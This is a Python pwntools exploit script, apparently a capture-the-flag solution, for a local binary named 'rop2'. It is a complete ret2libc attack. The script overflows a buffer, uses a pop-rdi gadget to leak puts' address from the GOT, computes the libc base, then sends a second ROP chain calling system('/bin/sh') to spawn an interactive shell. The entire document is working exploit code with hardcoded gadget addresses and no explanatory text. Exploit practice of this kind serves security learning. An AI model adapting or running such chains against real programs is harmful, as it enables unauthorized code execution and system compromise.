from pwn import * #64bit

e = ELF("./rop2")
libc = e.libc

p = process("./rop2")
ret = 0x40101a
puts_plt = 0x401090
puts_got = 0x403fc0
poprdi = 0x401313

payload = b"A"*0x40
payload += b"A"*8
#payload += p64(ret)
payload += p64(poprdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.symbols['main'])

p.recvuntil(b"gets and puts need only one parameter. much easier!!")

p.sendline(payload)
put_address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b"\x00"))
#log.info("add : "+ hex(put_address))
libc_base = put_address - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + list(libc.search(b'/bin/sh'))[0]

payload = b"A"*0x40
payload += b"A"*8
payload += p64(ret)
payload += p64(poprdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
